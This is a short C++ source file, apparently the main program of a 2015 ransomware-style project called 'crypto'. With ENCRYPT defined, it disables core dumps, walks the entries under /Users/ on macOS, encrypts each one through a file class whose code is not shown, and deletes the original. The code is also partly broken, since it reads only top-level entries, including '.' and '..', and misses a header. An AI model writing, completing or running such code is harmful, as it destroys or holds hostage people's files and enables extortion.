//
//  main.cpp
//  crypto
//
//  Created by Giammarco René Casanova on 31/08/15.
//  Copyright (c) 2015. All rights reserved.
//

#include "file.h"
#include <dirent.h>
#include <unistd.h>

void spc_limit_core();

#define ENCRYPT

int main()
{
    spc_limit_core();
    
    DIR *theFolder = opendir("/Users/");
    struct dirent *next_file;
    char filepath[256];
    file f;
    
    while ( (next_file = readdir(theFolder)) != NULL )
    {
        // build the path for each file in the folder
        sprintf(filepath, "%s/%s", "/Users/", next_file->d_name);

#ifdef ENCRYPT
        // encrypt file
        f.set_name(filepath);
        f.cryptfile();
#else
        // decrypt file
        f.set_name(filepath);
        f.decryptfile();
#endif
        // remove file
        remove(filepath);
     }
    
    return 0;
}

void spc_limit_core() {
    struct rlimit rlim;
    
    rlim.rlim_cur = rlim.rlim_max = 0;
    setrlimit(RLIMIT_CORE, &rlim);
}


